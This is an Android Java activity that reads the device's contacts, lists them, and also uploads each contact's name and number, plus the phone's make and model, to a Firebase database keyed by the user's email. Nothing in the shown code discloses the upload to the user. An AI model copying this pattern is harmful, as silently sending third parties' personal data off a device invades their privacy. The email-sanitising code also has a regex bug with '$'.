package com.myapplication;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;

public class fetch_contacts extends AppCompatActivity {
//initialize variables
    RecyclerView recyclerview;
    ArrayList<ContactModel> arrayList=new ArrayList<ContactModel>();
    MainAdapter adapter;
    int index=0;
    String mail="";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fetch_contacts);
Intent i = getIntent();
mail= i.getStringExtra("mail");        //assign variable
        recyclerview=findViewById(R.id.recycler_view);
        //Check permission
        checkPermission();

    }

    private void checkPermission() {
        //check condition
        if(ContextCompat.checkSelfPermission(fetch_contacts.this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
            //when permission is not granted
            //grand permission
            ActivityCompat.requestPermissions(fetch_contacts.this,new String[]{Manifest.permission.READ_CONTACTS},100);
        }
        else{
            //when permission is granted
            //create method
            getContactList();
        }

    }

    private void getContactList() {
        //initizalize uri
        Uri uri= ContactsContract.Contacts.CONTENT_URI;
        //sort by ascending
        String sort=ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+ " ASC";
        //Initialize cursor
        Cursor cursor=getContentResolver().query(uri,null,null,null,sort);
            //check condition
            if(cursor.getCount()>0){
                //when count is greater than 0
                //use while loop
                while (cursor.moveToNext()){
  index++;
                    //cursor move to next
                    //get contact id
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    //get contact name
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    //initialize phone Uri
                    Uri uriPhone=ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                    //initizalize selection
                    String selection=ContactsContract.CommonDataKinds.Phone.CONTACT_ID+"=?";
                    //Initialize phone cursor
                    Cursor phonecursor=getContentResolver().query(uriPhone,null,selection,new String[]{id},null);
                    //check condition
                    if (phonecursor.moveToNext()){
                        //when phone cursor moves to next
                        String number= phonecursor.getString(phonecursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        //initialize contact model
                        ContactModel model=new ContactModel(name,number);
//                        //set the name
//                        model.setName(name);
//                        //set the number
//                        model.setNumber(number);
                        //add model in array list
                        arrayList.add(model);
                        //add contact to server

                        SendDataToServer(model);
                        //close phone cursor
                        phonecursor.close();
                    }
                }
                //close cursor
                cursor.close();

        }
            //set layout manager
        recyclerview.setLayoutManager(new LinearLayoutManager(this));
            //initialize adapter
        adapter=new MainAdapter(this,arrayList );
        //set adapter
        recyclerview.setAdapter(adapter);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull @NotNull String[] permissions, @NonNull @NotNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //check condition
        if(requestCode==100 && grantResults.length>0 &&grantResults[0]==PackageManager.PERMISSION_GRANTED){
            //when permission is granted
            //call method
            getContactList();
        }
        else{
            //when permission is denied
            //display toast
            Toast.makeText(fetch_contacts.this,"Permission denied.",Toast.LENGTH_SHORT).show();
            //call check permission method
            checkPermission();
        }
    }
    private void SendDataToServer(ContactModel contactItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(getEmail())
                .child("Contacts").child(String.valueOf(index));
        myRef.setValue(contactItem);
        DatabaseReference ref =database.getReference(getEmail()).child("Device Name");
        ref.setValue(getDeviceName());


    }
    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    public String getEmail() {

        if(mail.contains(".")){
            mail=mail.replace(".","a");
        }
        if(mail.contains("#")){
            mail=mail.replaceAll("#","h");
        } if(mail.contains("$")){
            mail=mail.replaceAll("$","d");
        }
        return mail;
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
}
